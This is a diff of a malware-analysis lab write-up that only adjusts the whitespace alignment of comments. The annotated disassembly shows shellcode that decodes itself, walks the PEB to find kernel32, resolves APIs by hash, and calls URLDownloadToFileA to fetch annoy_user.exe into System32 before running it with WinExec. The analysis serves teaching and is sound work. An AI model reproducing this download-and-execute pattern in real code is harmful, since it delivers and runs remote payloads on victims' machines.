@@ -57,22 +57,22 @@ Then, the binary adds the value _0x8D_ to _ECX_ and jumps to the instruction loc
 This function is a loop that will execute the following instructions:
 
 ```
-lodsb					-> AL = [SI] (ESI + 1)
-mov     dl, al			-> DL = AL
+lodsb			-> AL = [SI] (ESI + 1)
+mov     dl, al		-> DL = AL
 sub     dl, 41h ; 'A'	-> DL = DL - 0x41
-shl     dl, 4			-> DL = DL << 4
-lodsb					-> AL = [SI] (ESI + 1)
+shl     dl, 4		-> DL = DL << 4
+lodsb			-> AL = [SI] (ESI + 1)
 sub     al, 41h ; 'A'	-> AL = AL - 0x41
-add     al, dl			-> AL = AL + DL
-stosb					-> [DI] = AL (EDI + 1)
-dec     ecx				-> ECX = ECX - 1 (Initial ECX value is 0x8D = 141)
+add     al, dl		-> AL = AL + DL
+stosb			-> [DI] = AL (EDI + 1)
+dec     ecx		-> ECX = ECX - 1 (Initial ECX value is 0x8D = 141)
 jnz     short loc_20C
 ```
 
 Before that, we have to take in mind that the following instructions are executed:
 
 ```
-pop     esi			-> ESI = ESP = return address = 0x00000224
+pop     esi		-> ESI = ESP = return address = 0x00000224
 push    esi
 mov     edi, esi	-> EDI = ESI = ESP = 0x00000224
 ```
@@ -164,19 +164,19 @@ The second one will redirect the execution flow to a new routine _loc_7A_, which
 seg000:0000007A loc_7A:                                 ; CODE XREF: seg000:0000009C↓p
 seg000:0000007A                 push    esi
 seg000:0000007B                 xor     eax, eax
-seg000:0000007D                 mov     eax, fs:[eax+30h]					-> PEB
+seg000:0000007D                 mov     eax, fs:[eax+30h]		-> PEB
 seg000:00000081                 test    eax, eax
 seg000:00000083                 js      short loc_94
-seg000:00000085                 mov     eax, [eax+0Ch]						-> EAX = PEB_LDR
-seg000:00000088                 mov     esi, [eax+1Ch]						-> ESI = InInitializationOrderModuleList (pointer to LDR_DATA_TABLE_ENTRY[0x10])
-seg000:0000008B                 lodsd								-> EAX = ESI = LDR_DATA_TABLE_ENTRY[0x10] 
-seg000:0000008C                 mov     eax, [eax+8]					-> EAX = LDR_DATA_TABLE_ENTRY[0x10 + 0x8] = DllBase
+seg000:00000085                 mov     eax, [eax+0Ch]			-> EAX = PEB_LDR
+seg000:00000088                 mov     esi, [eax+1Ch]			ESI = InInitializationOrderModuleList (pointer to LDR_DATA_TABLE_ENTRY[0x10])
+seg000:0000008B                 lodsd					-> EAX = ESI = LDR_DATA_TABLE_ENTRY[0x10] 
+seg000:0000008C                 mov     eax, [eax+8]			-> EAX = LDR_DATA_TABLE_ENTRY[0x10 + 0x8] = DllBase
 seg000:0000008F                 jmp     loc_99
 seg000:00000094 ; ---------------------------------------------------------------------------
 seg000:00000094
 seg000:00000094 loc_94:                                 ; CODE XREF: seg000:00000083↑j
 seg000:00000094                                         ; seg000:loc_94↓j
-seg000:00000094                 jmp     loc_94								-> Infinit loop
+seg000:00000094                 jmp     loc_94				-> Infinit loop
 seg000:00000099 ; ---------------------------------------------------------------------------
 seg000:00000099
 seg000:00000099 loc_99:                                 ; CODE XREF: seg000:0000008F↑j
@@ -248,9 +248,9 @@ seg000:0000013D                 call    dword ptr [ebp-0Ch]
 As we can see, the function _sub_2E_ is called 6 times in this function, also we check how it passes two arguments:
 
 ```
-mov     edx, eax			-> EDX = kernel32.dll DllBase
-push    0EC0E4E8Eh			-> Hash
-push    edx					-> kernel32.dll DllBase
+mov     edx, eax	-> EDX = kernel32.dll DllBase
+push    0EC0E4E8Eh	-> Hash
+push    edx		-> kernel32.dll DllBase
 call    sub_2E
 ```
 
@@ -365,7 +365,7 @@ Great! We have identified almost every function call, only the one with the valu
 
 ```
 seg000:000000E9                 lea     eax, [ebx]
-seg000:000000EB                 push    eax             ; URLMON
+seg000:000000EB                 push    eax		; URLMON
 seg000:000000EC                 call    dword ptr [ebp-4] ; LoadLibraryA
 seg000:000000EF                 push    702F1A36h
 seg000:000000F4                 push    eax
@@ -432,7 +432,7 @@ seg000:000000E0                 push    edx
 seg000:000000E1                 call    sub_2E
 seg000:000000E6                 mov     [ebp-14h], eax
 seg000:000000E9                 lea     eax, [ebx]
-seg000:000000EB                 push    eax             ; URLMON
+seg000:000000EB                 push    eax            	; URLMON
 seg000:000000EC                 call    dword ptr [ebp-4] ; LoadLibraryA
 seg000:000000EF                 push    702F1A36h       ; URLDownloadToFileA
 seg000:000000F4                 push    eax
@@ -474,7 +474,7 @@ seg000:0000011B                 push    ecx
 seg000:0000011C                 lea     eax, [ebx+48h]
 seg000:0000011F                 push    eax
 seg000:00000120                 lea     eax, [ebx+7]	; http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
-seg000:00000123                 push    eax			; szURL = http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
+seg000:00000123                 push    eax	; szURL = http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
 seg000:00000124                 push    ecx
 seg000:00000125                 call    dword ptr [ebp-18h] ; URLDownloadToFileA
 ```
@@ -504,9 +504,9 @@ Then, it will call _URLDownloadToFileA_ to download a file to this location.
 seg000:0000011A                 push    ecx
 seg000:0000011B                 push    ecx
 seg000:0000011C                 lea     eax, [ebx+48h]	; 'C:\Windows\System32\1.exe'
-seg000:0000011F                 push    eax				; szFileName = 'C:\Windows\System32\1.exe'
+seg000:0000011F                 push    eax	; szFileName = 'C:\Windows\System32\1.exe'
 seg000:00000120                 lea     eax, [ebx+7]	; http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
-seg000:00000123                 push    eax			; szURL = http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
+seg000:00000123                 push    eax	; szURL = http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe
 seg000:00000124                 push    ecx
 seg000:00000125                 call    dword ptr [ebp-18h] ; URLDownloadToFileA
 ```
@@ -517,7 +517,7 @@ The shellcode will download a binary file from _http://www.practicalmalwareanaly
 
 ```
 seg000:0000012D                 lea     eax, [ebx+48h]	; 'C:\Windows\System32\1.exe'
-seg000:00000130                 push    eax		; lpCmdLine = 'C:\Windows\System32\1.exe'
+seg000:00000130                 push    eax	; lpCmdLine = 'C:\Windows\System32\1.exe'
 seg000:00000131                 call    dword ptr [ebp-14h] ; WinExec
 ```
 
